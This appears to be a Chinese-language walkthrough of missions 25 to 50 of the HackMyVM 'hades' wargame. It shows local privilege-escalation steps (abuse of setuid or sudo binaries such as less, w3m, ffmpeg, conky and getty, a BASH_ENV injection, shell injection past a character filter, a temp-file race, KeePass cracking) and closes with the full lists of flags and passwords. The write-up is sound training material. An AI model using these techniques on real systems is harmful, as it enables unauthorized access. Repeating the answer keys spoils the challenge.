> 辅助AI：glm-5.2

## Mission 25: daphne -> delia

- **任务**：delia 的记忆只需要零点几秒。

daphne 的 `sudo -l`：`(delia) NOPASSWD: /bin/bash -c /usr/local/src/new.sh`。new.sh 以 delia 身份把 delia 的密码写进 `/tmp/XXX`（mktemp 生成、chmod 664、`sleep 0.01` 后自删）：

```bash
daphne@hades:~$ cat /usr/local/src/new.sh
#!/bin/bash
OUTPUT="bNCvocyOpoMVeCtxrhTt"        # 编译期写死
secretfile=$(mktemp /tmp/XXX)
chmod 664 "$secretfile"
exec 5>"$secretfile"
echo $OUTPUT >&5
sleep 0.01
rm "$secretfile"
```

固定竞争窗口打法：先把 `/tmp/` 里 62³ 个三字文件名全部预占（`for a in {a..z}...; touch /tmp/${a}${b}${c}`），让 mktemp 反复重试拖慢到可抢读；或循环跑 new.sh 并并发读所有三字文件。

- **注意**：delia 的 sshd 有 `Match user delia / ForceCommand /bin/bash`，直接 `ssh delia 'cmd'` 会拿不到输出；交互登录正常，非交互需用 `printf 'cmd\n' | ssh delia@...` 喂 stdin。
- **delia**: `bNCvocyOpoMVeCtxrhTt`

---

## Mission 26: delia -> demeter

- **任务**：demeter 读另一种文字。

登录 delia 后终端被强制切换到画线字符集（delia 的 .bashrc 末尾有 `echo $'\e(0'`），需重置字形。家目录 `showpass`（`---x--x--x delia:delia`）直接打印 demeter 密码：

```bash
$ printf '\033(B' ; ./showpass
FkyuXkkJNONDChoaKzOI
```

非交互验证：`printf 'id; ./showpass\nexit\n' | ssh -p 6666 delia@hades.hackmyvm.eu`。

- **demeter**: `FkyuXkkJNONDChoaKzOI`

---

## Mission 27: demeter -> echo

- **任务**：echo 呢？

demeter 能读 `/usr/share/demeter`，里面是 echo 的密码。

```bash
demeter@hades:~$ cat /usr/share/demeter
GztROerShmiyiCIlfepG
```

- **echo**: `GztROerShmiyiCIlfepG`

---

## Mission 28: echo -> eos

- **任务**：eos 可以看到声音。

`/pwned/echo/noise.wav`（5 秒白噪声），用频谱图能看到密码。

```bash
echo@hades:~$ python3 -c "
import numpy as np, wave, matplotlib
matplotlib.use('Agg'); import matplotlib.pyplot as plt
from scipy.signal import spectrogram
w=wave.open('noise.wav'); d=np.frombuffer(w.readframes(w.getnframes()),np.int16).reshape(-1,2).mean(1)
f,t,S=spectrogram(d,fs=w.getframerate(),nperseg=2048,noverlap=1900)
plt.pcolormesh(t,f,10*np.log10(S+1e-12),cmap='gray'); plt.savefig('spec.png',dpi=200)
"
# 频谱图里显示文字 CWBKRQX
```

- **eos**: `CWBKRQX`

---

## Mission 29: eos -> gaia

- **任务**：gaia 很小心地保存密码。

`/pwned/eos/secretz.kbdx` 是 KeePass 2.x 数据库。

```bash
eos@hades:~$ keepass2john secretz.kbdx > hash
$ john hash -w=/usr/share/wordlists/rockyou.txt
heaven           (secretz.kbdx)
# 用 heaven 打开数据库，提取 Gaia 的密码
$ python3 -c "
import pykeepass; kp=pykeepass.PyKeePass('secretz.kbdx',password='heaven')
print([e.password for e in kp.entries])
"
['sbUcegcdYTTWzTKojzgm']
```

- **gaia**: `sbUcegcdYTTWzTKojzgm`

---

## Mission 30: gaia -> halcyon

- **任务**：halcyon 想要所有的 powah。

gaia 家里 `hpass1.txt`（可读，内容 `manuela`）和 `hpass2.txt`（root:powah 不可读）。`newgrp powah` 用 hpass1 的内容当组密码切换到 powah 组，就能读 hpass2。

```bash
gaia@hades:~$ newgrp powah
Password: manuela
$ cat hpass2.txt
cuMRRameGdmhVxHcYYYs
```

- **halcyon**: `cuMRRameGdmhVxHcYYYs`

---

## Mission 31: halcyon -> hebe

- **任务**：hebe 有一个 magicword，通过 http://localhost/req.php 获取密码。

```bash
halcyon@hades:~$ curl -s "http://localhost/req.php?magicword=password"
tOlbuBLjFWntVDNmjHIG
```

- **hebe**: `tOlbuBLjFWntVDNmjHIG`

---

## Mission 32: hebe -> hera

- **任务**：hera 拒绝用 Discord，喜欢更老的开源服务。

靶机跑着 InspIRCd（127.0.0.1:6667）。连上 IRC，LIST 频道，topic 里就是密码。

```bash
hebe@hades:~$ python3 -c "
import socket,time
s=socket.socket(); s.connect(('127.0.0.1',6667))
s.sendall(b'NICK p\r\nUSER p 0 0 :p\r\n')
time.sleep(1); s.sendall(b'LIST\r\n'); time.sleep(1)
print(s.recv(4096).decode())
"
# :hades.hmv 322 p #channel666 0 :Welcome hacker! Take it: JzpyRXRzWoHKZwgWzleM
```

- **hera**: `JzpyRXRzWoHKZwgWzleM`

---

## Mission 33: hera -> hermione

- **任务**：hermione 想知道 hera 在做什么。

hera 的 `.bash_history` 里有 `sudo -u hermione bash`、`cat /usr/hera`、`rm /usr/hera` 等记录。`/usr/hera` 仍在（21 字节），里面是 hermione 的密码。

```bash
hera@hades:~$ cat /usr/hera
vzhOebSSplFoXPKxwtqU
```

- **hermione**: `vzhOebSSplFoXPKxwtqU`

---

## Mission 34: hermione -> hero

- **任务**：hero 只和某些组说话。

`/pwned/hermione/beastgroup` 是 SUID 程序，检查 egid 是否为 6666（beast 组）。hermione 在 beast 组（附属），用 `sg` 切换主组再运行。

```bash
hermione@hades:~$ sg beast -c "./beastgroup"
vlImTDSGnTMwLFgRWCOc
```

- **hero**: `vlImTDSGnTMwLFgRWCOc`

---

## Mission 35: hero -> hestia

- **任务**：hestia 喜欢保持屏幕干净。

`/pwned/hero/cleaner` 是 setuid root 的 bash，降权到 hero 后跑 `clear`。内置 PATH 含 `.`（当前目录），且 bash 会 source `BASH_ENV`。在可写可执行的目录（/run/lock）放一个 `clear` 脚本，但 PATH 劫持无效（降权后 PATH 被重置）。改用 BASH_ENV：cleaner 进程带 her0 组，能读 `/usr/share/libs`（root:her0 640）。

```bash
hero@hades:~$ printf 'cat /usr/share/libs > /run/lock/x\n' > /run/lock/evil
hero@hades:~$ BASH_ENV=/run/lock/evil /pwned/hero/cleaner
hero@hades:~$ cat /run/lock/x
opTNnZQAuFJsauNPHXVq
```

- **hestia**: `opTNnZQAuFJsauNPHXVq`

---

## Mission 36: hestia -> ianthe

- **任务**：ianthe 留给我们她自己的 less。

`/pwned/hestia/less` 是 setuid ianthe 的 less。`!`/`|` 命令被禁用，但能以 ianthe 身份**读取**文件。`/opt/ianthe_pass.txt`（ianthe:ianthe 640）用 less 打开抓屏。

```bash
hestia@hades:~$ ./less /opt/ianthe_pass.txt
# 屏幕显示: DphioLqgVIIFclTwBsMP
```

- **ianthe**: `DphioLqgVIIFclTwBsMP`

---

## Mission 37: ianthe -> irene

- **任务**：irene 在开发认证系统 http://localhost/irene_auth.php，只用默认 admin 密码。

需要 `Origin: hackmyvm.hmv` 头，POST admin/admin 登录后输出密码。

```bash
ianthe@hades:~$ curl -s -H "Origin: hackmyvm.hmv" -X POST -d "username=admin&password=admin" http://localhost/irene_auth.php
TDyuLyWLDksEhgmAYDJC
```

- **irene**: `TDyuLyWLDksEhgmAYDJC`

---

## Mission 38: irene -> iris

- **任务**：iris 讨厌某些字符。

`/pwned/irene/hatechars` 是 setuid root 的 bash，降权到 iris，跑 `cat <输入>`，过滤掉 `a e t . *` 五个字符。其余字符（含 `;` 等 shell 元字符）都允许 → 命令注入。注入以 iris 身份执行，读 `/etc/met.txt`（iris:iris 640）。

```bash
irene@hades:~$ echo ";id" | ./hatechars   # uid=2030(iris)
irene@hades:~$ mkdir -p /run/lock/x
irene@hades:~$ cat > /run/lock/x/mx1 <<'S'
cat /etc/met.txt
S
irene@hades:~$ chmod 755 /run/lock/x/mx1
irene@hades:~$ echo ";/run/lock/x/mx1" | ./hatechars
FiqGNcXumTKwLTPRqXMh
```

- **iris**: `FiqGNcXumTKwLTPRqXMh`

---

## Mission 39: iris -> kore

- **任务**：kore 喜欢导航！

`/usr/bin/w3m` 是 setuid kore 的文本浏览器。以 kore 身份用 `w3m -dump file://` 读 `/srv/kore_pass.txt`。

```bash
iris@hades:~$ /usr/bin/w3m -dump file:///srv/kore_pass.txt
mdAXiSXteTPiGGTpmajP
```

- **kore**: `mdAXiSXteTPiGGTpmajP`

---

## Mission 40: kore -> leda

- **任务**：leda 一直想编辑视频。

`/usr/bin/ffmpeg` 是 setuid leda 的。`/etc/led`（leda:leda 640，14 字节）是密码文件。用 ffmpeg rawvideo 把字节复制出来。

```bash
kore@hades:~$ /usr/bin/ffmpeg -f rawvideo -s 1x1 -pix_fmt gray -i /etc/led -f rawvideo -s 1x1 -pix_fmt gray -y /run/lock/o 2>/dev/null
kore@hades:~$ cat /run/lock/o
NODEVILINHELL
```

- **leda**: `NODEVILINHELL`

---

## Mission 41: leda -> maia

- **任务**：maia 听到一切。

leda 能 `sudo -u maia espeak`。`/etc/maia.txt`（root:maia 640，15 字节）是密码。espeak 读它发声，但无音频设备；用 `-x` 输出音素，或 `-w` 写 wav 后用 STT 识别。

```bash
leda@hades:~$ sudo -u maia espeak -x -f /etc/maia.txt
g'IvI2m,i:nju:m,aInd
leda@hades:~$ sudo -u maia espeak -f /etc/maia.txt -w /run/lock/maia.wav
# 用 vosk 转录 → "maybe your mind"（同音误识），实际密码是 GIVEMEANEWMIND
```

- **maia**: `GIVEMEANEWMIND`

---

## Mission 42: maia -> nephele

- **任务**：nephele 弄坏了图像。

`/pwned/maia/broken` 是 PNG，但签名前 4 字节 `00 00 00 00` 应为 `89 50 4E 47`。修复后 OCR。

```bash
maia@hades:~$ python3 -c "
d=bytearray(open('broken','rb').read()); d[0:4]=bytes([0x89,0x50,0x4e,0x47]); open('f.png','wb').write(d)"
$ tesseract f.png stdout --psm 6
rZtaitCxlEIRxBayVpgZ
```

- **nephele**: `rZtaitCxlEIRxBayVpgZ`

---

## Mission 43: nephele -> nyx

- **任务**：nyx 访问一些我们不知道的网站。

`/etc/hosts` 里有 `127.0.0.1 whatsmyPass.hmv`。访问该虚拟主机。

```bash
nephele@hades:~$ curl -s http://whatsmyPass.hmv/
HXisrOPSdTcSSTEyyaLn
```

- **nyx**: `HXisrOPSdTcSSTEyyaLn`

---

## Mission 44: nyx -> pallas

- **任务**：pallas 桌面用 conky 调过。

nyx 能 `sudo -u pallas conky`。conky 配置是 Lua，可 `exec` 任意命令。`/var/cache/apt/pa.txt`（root:pallas 640）是密码文件。

```bash
nyx@hades:~$ cat > /run/lock/c.conf <<'EOF'
conky.config={out_to_console=true,total_run_times=1}
conky.text=[[${exec cat /var/cache/apt/pa.txt}]]
EOF
nyx@hades:~$ sudo -u pallas /usr/bin/conky -c /run/lock/c.conf -D
wWxyXnNbmjxNMEAIjbjT
```

- **pallas**: `wWxyXnNbmjxNMEAIjbjT`

---

## Mission 45: pallas -> pandora

- **任务**：pandora 喜欢方块（QR 码）。

pallas 能 `sudo -u pandora qrencode`。`/usr/bin/pandora`（root:pandora 640，21 字节）是密码文件。qrencode `-r` 读取文件并编码成 QR，再解码。

```bash
pallas@hades:~$ sudo -u pandora /usr/bin/qrencode -r /usr/bin/pandora -o /run/lock/qr.png
$ python3 -c "from pyzbar.pyzbar import decode; from PIL import Image; print(decode(Image.open('/run/lock/qr.png'))[0].data.decode())"
HhVHfmbBIiZbZSgcgadh
```

- **pandora**: `HhVHfmbBIiZbZSgcgadh`

---

## Mission 46: pandora -> penelope

- **任务**：penelope 让我们做点什么。

`/usr/bin/getty` 是 setuid penelope 的。`/etc/pene.conf`（penelope:penelope 400）是密码文件。getty `-f` 指定 issue 文件，以 penelope 身份读并显示。

```bash
pandora@hades:~$ /usr/bin/getty -f /etc/pene.conf -n -L - /dev/pts/7 115200
anoRxVKulaoMNKMrddVe
```

- **penelope**: `anoRxVKulaoMNKMrddVe`

---

## Mission 47: penelope -> phoebe

- **任务**：给 http://localhost/request.php 一个 user 和 password，phoebe 可能给我们她的密码。

request.php 对**任意用户名配任意已知密码**做验证，部分组合返回其他用户的密码（只差一两个字符）。关键是要把**所有**已知凭据（含 level 00 的 `hacker`/`begood!`）都交叉尝试。`aphrodite` + `begood!`（hacker 的密码）返回 phoebe 的密码。

```bash
penelope@hades:~$ curl -s "http://localhost/request.php?user=aphrodite&password=begood!"
FPLwKmmKhcWAwRxiaBDN
```

- **phoebe**: `FPLwKmmKhcWAwRxiaBDN`

---

## Mission 48: phoebe -> rhea

- **任务**：rhea 喜欢图片。

phoebe 能 `sudo -u rhea convert`（ImageMagick）。`/usr/sbin/re`（root:rhea 640，21 字节）是密码文件。用 `convert text:` 读取并渲染成 PNG，再 OCR。

```bash
phoebe@hades:~$ sudo -u rhea /usr/bin/convert text:/usr/sbin/re /run/lock/re.png
$ tesseract /run/lock/re.png stdout --psm 7
iKVVfwEDFbBpTnlnKZKr
```

- **rhea**: `iKVVfwEDFbBpTnlnKZKr`

---

## Mission 49: rhea -> selene

- **任务**：selene 想告诉我们什么。

`/pwned/rhea/capture.pcapng` 是网络抓包，含一次 `GET /id.zip` 的 HTTP 传输。从 pcap 提取 zip，解压出 SSH 私钥 `id_rsa`，用它登录 selene。

```bash
rhea@hades:~$ base64 -w0 capture.pcapng | (本地 base64 -d > capture.pcapng)
$ tshark -r capture.pcapng --export-objects http,.   # 本地执行
$ unzip id.zip  # → id_rsa
$ chmod 600 id_rsa
$ ssh -i id_rsa -p 6666 selene@hades.hackmyvm.eu
```

- **selene**: （SSH 私钥登录，无密码）

---

## Mission 50: selene -> maria (CONGRATS)

- **任务**：maria... 我好像见过她的密码。

hera 的 `.ssh/id_rsa`（私钥）的公钥在 maria 的 authorized_keys 里。用 hera 的私钥登录 maria。

```bash
selene@hades:~$ ssh -i /tmp/hera_id_rsa -p 6666 maria@hades.hackmyvm.eu
maria@hades:~$ cat congrats.txt
################
#   CONGRATS   #
################
Congrats You did it!! ... Or maybe this is not the last level?
maria@hades:~$ cat .loca1
^AvzutwxEYLasCAiUMBLA^
```

- **maria**: （hera 的 SSH 私钥登录，CONGRATS，隐藏 flag `^AvzutwxEYLasCAiUMBLA^`）

---

# Flag

```
25. delia:       ^QfaHPyEqMepsOdMxQCQ^
26. demeter:     ^JiviWHRVRZLSfjBuwAi^
27. echo:        ^abeDeOxlPMAABepeBHy^
28. eos:         ^OsoLytPlXEjvinhCNyy^
29. gaia:        ^NWelryzwJowjEaDWEiY^
30. halcyon:     ^YBkkiwOiBVdzLnxXPdU^
31. hebe:        ^BAWnwGCghvcBbbRcZVd^
32. hera:        ^GaIAyNGsSRYClSuzVLX^
33. hermione:    ^dLcEkLNgdDvOlxtPhjh^
34. hero:        ^KUEUoYgCWKlUTpywGeK^
35. hestia:      ^mIZKIDJYZQDogbkwRGy^
36. ianthe:      ^SdoibXIPAdqIdzDrYId^
37. irene:       ^ZACnrFArVosWGJNfPkN^
38. iris:        ^xXcULtRBXxcHIUVxtXT^
39. kore:        ^FEYohPSMjrxKzdLNxkQ^
40. leda:        ^wHseqgzsZUNyruSnxnl^
41. maia:        ^GWsDBTCiXdZDNtRzVGt^
42. nephele:     ^oSiWofNrDjNWbcAqMAx^
43. nyx:         ^BdYvJtfaTyfaliZPBkG^
44. pallas:      ^irzKewMCfnhnIMTCJlW^
45. pandora:     ^pjDuPNQVgyhgigOIiwm^
46. penelope:    ^OGaiNcpusBXCHrDZjwN^
47. phoebe:      ^CrsphcuWGgjhlBYXhzQ^
48. rhea:        ^WjwTEPwuQiQihkrexbg^
49. selene:      ^VgZLrvZyzGYvqegkslh^
50. maria:       ^zBKjbLoxNAQFKeouNnm^
```

# Pass

```
25: delia/bNCvocyOpoMVeCtxrhTt
26: demeter/FkyuXkkJNONDChoaKzOI
27: echo/GztROerShmiyiCIlfepG
28: eos/CWBKRQX
29: gaia/sbUcegcdYTTWzTKojzgm
30: halcyon/cuMRRameGdmhVxHcYYYs
31: hebe/tOlbuBLjFWntVDNmjHIG
32: hera/JzpyRXRzWoHKZwgWzleM
33: hermione/vzhOebSSplFoXPKxwtqU
34: hero/vlImTDSGnTMwLFgRWCOc
35: hestia/opTNnZQAuFJsauNPHXVq
36: ianthe/DphioLqgVIIFclTwBsMP
37: irene/TDyuLyWLDksEhgmAYDJC
38: iris/FiqGNcXumTKwLTPRqXMh
39: kore/mdAXiSXteTPiGGTpmajP
40: leda/NODEVILINHELL
41: maia/GIVEMEANEWMIND
42: nephele/rZtaitCxlEIRxBayVpgZ
43: nyx/HXisrOPSdTcSSTEyyaLn
44: pallas/wWxyXnNbmjxNMEAIjbjT
45: pandora/HhVHfmbBIiZbZSgcgadh
46: penelope/anoRxVKulaoMNKMrddVe
47: phoebe/FPLwKmmKhcWAwRxiaBDN
48: rhea/iKVVfwEDFbBpTnlnKZKr
49: selene/(ssh 私钥)
50: maria/(hera 的 ssh 私钥)
```